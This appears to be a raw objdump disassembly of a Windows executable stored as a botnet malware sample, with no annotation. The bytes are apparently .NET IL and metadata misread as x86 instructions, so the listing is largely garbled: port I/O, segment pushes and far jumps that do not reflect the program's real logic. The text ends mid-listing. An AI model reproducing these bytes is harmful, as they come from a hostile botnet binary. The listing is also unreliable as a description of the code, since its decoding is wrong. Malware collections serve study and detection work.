
malware_samples/botnet/34cf1f43587e6a9673ba90c0bb5d9b449607d6396a59035fd925b6b67fe6a530.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	30 c7                	xor    %al,%bh
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 00                	add    %al,(%eax)
  402015:	6d                   	insl   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	9e                   	sahf
  4021d0:	25 00 70 7e 10       	and    $0x107e7000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 28                	add    $0x28,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 52 21 00       	and    $0x215272,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 4a                	jb     0x402240
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 52 21 00       	and    $0x215272,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 5c                	jb     0x402282
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 5c 26 00       	and    $0x265c72,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 4c             	add    %dh,0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
